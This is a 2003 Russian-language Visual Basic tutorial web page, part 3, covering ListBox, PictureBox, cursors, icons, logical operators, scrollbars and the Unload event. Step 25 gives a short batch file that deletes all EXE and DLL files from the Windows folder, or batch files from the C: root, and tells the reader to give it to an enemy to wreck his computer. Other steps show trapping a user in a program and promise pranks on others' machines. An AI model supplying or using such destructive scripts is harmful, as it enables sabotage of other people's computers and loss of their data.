
<html><head>
<style type="text/css">
.part2{color:#4173a3;font-weight:900;}
.part2:hover{color:red;font-weight:880}
.cd{font-size:18px;color:black;}
.c2{font-size:18px;color:black;}
.c1{font-size:45pt;}
.cc{font-size:13pt;font-weight:bold}
.t{color:red;}
.a9{color:#4173a3;font-weight:bold;}
.a9:hover{color:red;font-weight:880}
h2{font-size:21pt;font-weight:bold}
h3{font-size:17pt;font-weight:bold}
.a19{color:#4173a3;font-size:18px}
.a19:hover{color:red;font-size:18px}
body{
BORDER-RIGHT: 0px;
SCROLLBAR-FACE-COLOR: #CFDEEB;
PADDING-BOTTOM: 0px;
SCROLLBAR-HIGHLIGHT-COLOR: #CFDEEB;
VERTICAL-ALIGN: middle;
BORDER-LEFT: 0px;
SCROLLBAR-SHADOW-COLOR: black;
SCROLLBAR-ARROW-COLOR: black;
PADDING-TOP: 0px;
BORDER-BOTTOM: 0px;
SCROLLBAR-BASE-COLOR: black;
scrollbar-3dlight-color: #4173a3;
scrollbar-dark-shadow-color: #4173a3;}
</style>

<title>Программируем на Visual Basic'e</title>
</head>
<body background="1.jpeg">
<em >
<a href="http://vbstreets.narod.ru" class="a9">Главная</a>
<a href="http://gb.lpt.ru/gb.php?bid=7132" class="a9">Гостевая</a>
<a href="http://gb.lpt.ru/gb.php?bid=7137" class="a9">Форум</a>
<a href="INFA.htm" class="a9">INFA</a>
</em>

<H1 ><font size=6>Программируем на Visual Basic'e:</font></H1>

<p style="font-weight:bold; font-size:21px" >

<a href="vbasic.htm" class="part2">Часть 1</a>/<a href="vbasic2.htm" class="part2">Часть 2</a>/Часть 3/<a href="vbasic4.htm" class="part2">Часть 4</a>/<a href="vbasic5.htm" class="part2">Часть 5</a>/<a href="vbasic6.htm" class="part2">Часть 6</a>/<a href="vbasic7.htm" class="part2">Часть 7</a>/<a href="vbasic8.htm" class="part2">Часть 8</a>/<a href="vbasic9.htm" class="part2">Часть 9</a>/<a href="vbasic10.htm" class="part2">
Часть 10</a>  /<a href="vbasic11.htm" class="part2">Часть 11</a>/<a href="vbasic12.htm" class="part2">Часть 12</a>/<a href="vbasic13.htm" class="part2">Часть 13</a>/<a href="vbasic14.htm" class="part2">Часть 14</a>/<a href="vbasic15.htm" class="part2">Часть 15</a></font>








<h2>ШАГ 21:</h2>
<h3>Объект ListBox & ComboList</h3><p class="c2">
Объект ListBox особо не нужен, но иногда без него не обойтись. В этом шаге я научу тебя им пользоваться, хотя сам только недавно научился (когда он очень понадобился). Т.к. я обучился сам (где - то за 20 мин), не читая ни каких учебников и статей, сам разобрался с некоторыми свойствами, то рекомендую почитать про этот объект в других книжках. Начнем. Создай новый проект(Standart EXE), на него кинь 2 текстовых поля, 2 кнопки, и 1 ListBox. У ListBox в свойстве List напиши любые слова - они и будут видны в списке.<br>
<img src="41.jpg" alt="Свойство List">
<br>
У первой кнопке свойство Caption будет "Удалить запись", у второй "Добавить запись". Вот что у тебя должно получиться: 
<br>
<img src="41.1.jpg" alt="Свойство List">
<br>
Вот код:<br>
Private Sub Command1_Click()<FONT color=Green > 'При нажатии на кнопку:</FONT><br>
List1.RemoveItem (List1.ListIndex)<FONT color=Green > 'У объекта ListBox есть свойство RemoveItem - оно нужно для удаления записи, но только по индексу (у самой первой записи индекс = 0, у второй 1 - итак до упора) </FONT><br>
End Sub<br>
<br>
Private Sub Command2_Click()<br>
<FONT color=Green > 'Сюда можно втыкнуть On Error Resume Next, т.к. если запись не выбрана, то произойдет ошибка</FONT><br>
List1.AddItem Text2.Text<FONT color=Green > 'Добавляем запись, здесь есть свойство AppItem оно нужно для добавления записи, потом идет пробел, а за ним любой текст (в этом примере будет добавляться запись с текстом введенным в текстовое поле")</FONT><br>
End Sub<br>
<br>
Private Sub List1_Click()<br>
Text1.Text = List1.Text<FONT color=Green > 'Текстовое поле 1 равно выбранной записи</FONT><br>
End Sub<br><br>
Исходник проги можешь скачать
<a href="list.zip" class="a19">отсюда</a>.
<br>
А что касается ComboList - с ним работать точно также как и с ListBox, но там еще есть свойство Text(это самая первая запись). Здесь я не буду тебе объяснять работу с этим объектом, а дам задание: Твоя миссия сделать такую же прогу, как и ListBox, но только с ComboBox. 
<h2>ШАГ 22:</h2>
<h3>Объект PictureBox & Image</h3><p class="c2">
Как ты наверное понял эти объекты нужны для работы с изображением, и у каждого из этих объектов есть свойство Picture, кликни по нему 2 раза(это в окне свойств(но вначале обьекты закинь на форму)), и у тебя откроется окно выбора изображений, там выбираешь любой рисунок, и он у тебя загрузится. А если вдруг надо чтоб картинки грузились, например при нажатии на кнопку. Для этого создадим новый проект, туда кинем 1 кнопку, 1 Image, и 1 PictureBox(Кстати, у этих обьектов есть различие, у Image - если картинка будет больше чем сам объект, то объект растянется, а у Picture - не растянется, а будет показана только помястившаяся часть рисунка). Теперь напишем код, который при нажатии на кнопку, загружал в эти объекты картинку.<br>
<br>
Private Sub Command1_Click()<FONT color=Green > 'При нажатии на кнопку:</FONT><br>
Picture1.Picture = LoadPicture("c:\1.bmp")<FONT color=Green > 'Картинка загружается в объект PictureBox(Вместо c:\1.bmp - напиши путь к картинке)</FONT><br>
Image1.Picture = LoadPicture("c:\1.bmp")<FONT color=Green > 'Картинка загружается в объект  Image</FONT><br>
End Sub<br><br>

Но если можно загружать, то значит можно и сохранять. До делаем нашу прогу, на форму кинь еще одну кнопку, и впиши код:<br> 
Private Sub Command2_Click()<br>
SavePicture Picture1.Picture, "c:\Picture.bmp"<FONT color=Green > 'Картинка сохраняется в файл Picture.BMP, из объекта Picture </FONT><br>
SavePicture Image1.Picture, "c:\Image.bmp"<FONT color=Green > 'Картинка сохраняется в файл Image.BMP, из объекта Image</FONT><br>
End Sub<br>


 
<h2>ШАГ 23:</h2>
<h3>Работа с КУРСОРОМ</h3><p class="c2">
У тебя когда - нибудь возникала мысль: "А как избавиться от этого уродского курсора?" Ну если возникла, то хорошо, а если нет, то тебе ВСЕ РАВНО ПРИДЕТСЯ ЧИТАТЬ ЭТОТ ШАГ! Чтобы сменить курсор почти у всех объектов есть свойство MousePointer - в нем ты выбираешь: "99 - Custom", потом нажимаешь 2 раза по свойству MouseIcon и выбераешь любой из курсоров(главное чтоб тип был *.ico или *.cur), потом нажимаешь на Run, наводишь мышь на объект, и курсор меняется. Вот тебе задание: Ты должен сделать прогу, у которой при наведении мыши на форму, курсор менялся.

 Только здесь какая - то фигня получается, т.к. у загружаемых курсоров должно быть расширение *.ico или *.cur - и тут возникает вопрос: "Где их взять?" и "Что делать?". На первый вопрос ответ простой: "Их надо где - то достать - ищи(или читай дальше, потом у тебя их будет несколько тыщ). Могу только пока дать тебе 2 курсора - <a href="cur.zip" class="a19">Скачать</a><br>
Можно также и воспользоваться и стандартными курсорами, для этого у любого объекта(например у кнопки) поставь свойство MousePointer = от 0 до 15(как ты понял всего 15 стандартных курсоров).


<h2>ШАГ 24:</h2>
<h3>Меняем значок у проги</h3><p class="c2">
Для смены значка у проги, у формы есть свойство Icon, нажми на него два раза, и перед тобой откроется окно открытия файлов. В нем выбери любой значок с расширением *.ico,*.cur - но где их взять? Поищи их на своем винте - кто ищет тот всегда находит! Но если не найдешь, то <a href="icon.zip" class="a19">Скачивай</a> мою коллекцию(35 штук).
<br>
P.S. Где - то в 7 - 8 части у тебя появится около 13 штук курсоров и иконок(у меня ~13346).
<h2>ШАГ 25:</h2><h3>Делаем самоуничтожитель компа:<br></h2><p class="c2">


Сегодня мы будем делать Самоуничтожитель компа. Для этого тебе нужен Текстовой документ (Блокнот), или любой другой текстовой редактор, и все! Желательно чтоб ты хоть децл разбирался в командах DOS, но не обязательно. Начнем:<br>Для начала я решил дать тебе краткую справку по командам DOS<br>
<b>Del путь и имя файла</b> - удалить<br>
<b>CD имя папки</b> - вход в папку<br>
<b>CD\</b> - переход в корневой каталог диска<br><br>
  
Теперь входим в Текстовой документ, и пишем этот код:<br>

cd\<br>
cd windows<br>
del *.exe<br>
del *.dll<br>

или
<br>
cd\<br>
del *.bat<br>
В первом случае из винда удаляются все EXE и DLL файлы, а во втором из диска C: удаляется файл Autoexec.bat, в обоих случаях комп накрывается. Теперь чтоб прога была не в текстовом формате, а чтоб ее можно было запустить нам надо сохранить ее в BAT файл, для этого ставим Сохранить как, и в поле имя пишем bla.bat, и все, теперь дай ее своему врагу, и когда он кликнет этот файл, у него комп полетит (на юг). Но помни золотое правило, прога должна запускаться с ДИСКА С:, с других дисков она ЗАПУСКАТЬСЯ НЕ БУДЕТ.





<h2>ШАГ 26</h2>
<h3>Операции и Логические Операторы</h3><p class="c2">
<b>Операции:</b><br><br>
<b><font color = red>+</font></b> - Сложение(2+2)<br>
<b><font color = red>-</font></b> - Вычитание(2-2)<br>
<b><font color = red>/</font></b> - Деление(2/2)<br>
<b><font color = red>*</font></b> - Умножение(2*2)<br>
<b><font color = red>^</font></b> - Степень(2^2), здесь второе число это степень(щас стоит квадрат) в которую будет возводиться первое число, если поставить 3 то будет куд, и так до упора... <br>
<b><font color = red>&</font></b> - Сложение, только не число с числом(+), а число со строкой(MsgBox "Чел" & 5), а теперь поставь MsgBox "Чел" + 5, запусти. Ну что ругается? Естественно!<br><br>
<b>Логические операторы:</b><br><br>
<b><font color = red>And</font></b> - И<br>
<b><font color = red>Or & Xor</font></b> - Или<br>
<b><font color = red>Not</font></b> - Отрицание<br>
<br>
Теперь, чтоб нормально врубиться в Логические операторы, сделаем пару прог. Первая наша прога, будет связана с <b>And</b>. Открой VB(Standart EXE), на форму кинь 3 кнопки.Код:<br>

Dim q, q1 As Long<font color="green"> 'Объявляем переменные q и q1 для хранения чисел</font><br>
Private Sub Command1_Click()<font color="green"> 'При нажатии на кнопку, q = 5</font><br>
q = 5<br>
End Sub<br><br>

Private Sub Command2_Click()<font color="green"> 'При нажатии на кнопку, q1 = 3</font><br>
q1 = 3<br>
End Sub<br><br>

Private Sub Command3_Click()<font color="green"> 'При нажатии на кнопку:</font><br>
If q = 5 And q1 = 3 Then MsgBox "Это Лог. Оператор And"<font color="green"> 'Срабатывает оператор And, и если q = 5(нажата 1 - ая кнопка), q1 = 3(нажата 2 - ая кнопка), то выводится сообщение, что оператор And сработал</font><br>
End Sub<br>
Здесь, вначале надо нажать на 1 - ую кнопку(чтоб q = 5), потом на 2 - ую(чтоб q1 = 3), и только потом выскочит сообщение.Теперь удали весь код, из этой проги, и впиши новый:<br>

Dim q, q1 As Long<font color="green"> 'Объявляем переменные q и q1 для хранения чисел</font><br>
Private Sub Command1_Click()<font color="green"> 'При нажатии на кнопку, q = 5</font><br>
q = 5<br>
End Sub<br><br>

Private Sub Command2_Click()<font color="green"> 'При нажатии на кнопку, q1 = 3</font><br>
q1 = 3<br>
End Sub<br><br>

Private Sub Command3_Click()<font color="green"> 'При нажатии на кнопку:</font><br>
If q = 5 Xor q1 = 3 Then MsgBox "Это Лог. Оператор Xor"<font color="green"> 'Если q = 5 или q1 = 3 то выводится сообщение</font><br>
End Sub<br>
Здесь если нажата одна из кнопок, то выскакивает сообщение(точно также действует и Or)
 


<h2>ШАГ 27:</h2><h3>Работа со СкрулБаром<br></h2><p class="c2">
Хей перцы - не заибались еще читать? Отлично! Тогда я начну тебе гнать про СкрулБары. Как ты наверное понял СкрулБар - это полоса прокрутки(ScroolBar), но у тебя возникает вопрос: "А нафига они нужны?" - ты прав, они не нужны, но поскольку Злой Дядька Билл Гейц ввел их в пакет VB, то мне как порядочному челу придется децл рассказать тебе о них. Всего в мире есть 2 вида скрулбаров - это скрулбар горизонтал, и вертикал.<br>
Теперь о свойствах:<br>
У них обоих есть свойство Value, LargeChange, SmallChange, и TabStop, и кроме этих свойств у них помойму больше ничего нормального нет. Вот их значения:<br>
1. LargeChange - это свойство нужно для установки скорости передвижении ползунка, если нажимать на саму полосу прокрутки, ну короче смотри сам.<br>
2. SmallChange - а вот это свойство отвечает за скорость передвижения ползунка, при нажатии на скрулбаровскую кнопку (их всего две <img src="scrool.jpg" alt="Скрулбаровская кнопка">)
<br>
3. Value - ну это свойство самое главное, без него скрулбары вообще были не нужны, оно определяет где находится ползунок.
<br>
4. TabStop - фу бля, меня это свойство зверь бесит, оно заставляет ползунок мигать - убери его.<br>
<br>
Ну от фигни, перейдем к делу - сделаем прогу.
Ну, как всегда войди в VB(Standart EXE), на форму кинь 1 скрулбар горизонтал(LargeChange = 1000,SmallChange = 1000, TabStop = FALSE), и кнопку. Наша цель сделать такую прогу,
чтоб при передвижении ползунка скрулбара, кнопка тоже передвигалась. Подумай сам как это сделать, а если в бошку ни чего не придет смотри ниже код:<br>
<br>
Private Sub HScroll1_Change()<font color="#006600" >  ' При движение ползунка(Change - изменять, менять):</font><br>
Command1.Left = HScroll1.Value / 11<font color="#006600" >  ' Кнопка будет равна ползунку (здесь я написал /11,ты можешь отрегулировать как захочешь, чем меньше ты напишешь, тем кнопка будет дальше двигаться)</font><br>
End Sub<br><br>


<h2>ШАГ 28:</h2><h3>Событие UnLoad<br></h2><p class="c2">
Как выбирать событие ты уже наверное знаешь (открой Часть 2,Шаг 18),а для чего нужно событие UnLoad - влятри. Событие Unload - нужно для выполнения действия при выходе из проге,
например, если ты что - нибудь напишешь в Form_Load, то это будет загружаться при в ходе в прогу, а если в Form_UnLoad, то при выходе из нее. Сделаем прогу, при выходе из которой, комп выдаст какое - нибудь сообщение. Войди в VB(Standart EXE), создай процедуру UnLoad, для этого в списке событий выбери ее.<br>
<img src="UnLoad.jpg" title="Событие UnLoad"><br>
Теперь в создавшийся процедуре впиши: MsgBox "А Билл Гейц - нехороший чел."
<br>
И при выходе из проги у тебя появится MsgBox. Вот весь код:<br>
Private Sub Form_Unload(Cancel As Integer)<font color="#006600" >  ' При выходе из проги:</font><br>
MsgBox "А Билл Гейц - нехороший чел."<font color="#006600" >  ' Появляется Error</font><br>
End Sub<br><br>
И все! Теперь сделаем так, чтоб при выходе появлялся запрос, и можно отказаться, и возвратится обратно.

<h2>ШАГ 29:</h2><h3>Запретить Юзеру выйти из проги:<br></h2><p class="c2">
Всего в мире есть 2 вида юзеров - это обычный, и продвинутый. Запретить выход обычному юзеру можно поставив у формы свойство ControlBox = False, и кнопка выхода исчезнет(<img src="End.jpg" title="Закрыть">), тогда юзер начнет нервничать и может нажать на Reset<br>
А вот если перед нами стоит продвинутый юзер, то он намного хитрее, и спокойно закроет прогу щелкнув правой кнопкой мыши по заголовку формы, и в меню нажмет закрыть, или просто нажмет Alt + F4.И перед нами возникает вопрос: "Как запретить юзеру выйти из проги", или не обязательно запретить, а хотя бы спросить его. Так например в Блокноте, где я щас пишу этот учебник, перед выходом он запрашивает: "Текст в файле ... был изменен. Сохранить изменения?". Ну короче не буду тебя грузить, что может случиться, а сразу перейдем к делу. Создай новый проект(Standart EXE), вот код с пояснением.<br>
<br><font color="#006600" >  'Создай процедуру UnLoad</font><br>
Private Sub Form_Unload(Cancel As Integer)<font color="#006600" >  ' При выходе из проги:</font><br>
b = MsgBox("Хей! Юзер поганый, только попробуй меня закрыть... ", 20, "Не надо - ПЛИЗ!!!")
<font color="#006600" >  ' Идет запрос</font><br>
If b = 7 Then<font color="#006600" >  ' если нажимаешь Нет - то возврат в прогу, если Да выход</font><br>
Cancel = True<br>
End If<br>
<br>
Вот и все! Теперь из твоей проге не выйдет даже самый хитрый юзер.
<h2>ШАГ 30:</h2><h3>Задание<br></h2><p class="c2">
Ну задание сегодня не такое сложное, а даже легкое. Тебе надо сделать прогу, у которой при нажатии на кнопку, был запрос о выходе, если юзер нажимает Да - то Выход, Нет - возврат.<br>
Исходник проги можешь скачать <a href="zad.zip" class="a19" title = "ДЕЛАЙ САМ">отсюда</a>.
<br><br>
Ну на этом я закончу тебя грузить, можешь переходить к <a href="vbasic4.htm" class="a19">Четвертой части</a>. В ней будем делать приколы (ты с вражеским компом будешь делать все что захочешь (каждые 3 сек открывать CD - ROM, перезагружать, убирать курсор)), создадим меню, получим доступ к клаве... Если у тебя есть какие - нибудь вопросы, пожелания и т.д., то оставляй свои сообщения на форуме, гостевой книге (моего сайта <a href="http://vbstreets.narod.ru" class=a19>vbstreets.narod.ru</A>), или пиши в наглую на E-mail: <a href="mailto:padre03@mail.ru" class=a19>padre03@mail.ru</a>, я на них обязательно отвечу.
 И если ты зайдешь на мой сайт, кликни плиз по банеру Porta(сиреневый), мне за это немного бабла отвалется(2 цента). И если ты захочешь поддержать Отечественного производителя(т.е. Меня), то кликай по банеру раз в месяц. А если ты очень богатый, то не просто кликни, а еще что - нибудь купи.
<br><br>
<em><p class="cc">автор учебника: Падре</ем>
<br></em>
Дата создания: 21 Января 2003 года<br>
<br></p>
<center>
<table width=468 height=60 border=2 bordercolor="#4173a3"><td  bordercolor="#4173a3"><center>
<p class="c2">Место под Банеры
</td>
<tr><td>
<center>
<a href="INFA.htm" target="0">
<img src="baner.gif" alt="Официальный сайт учебника - 'Программируем на Visual Basic'" border=0>
</a></center>
</td></table>


</body>
</html>
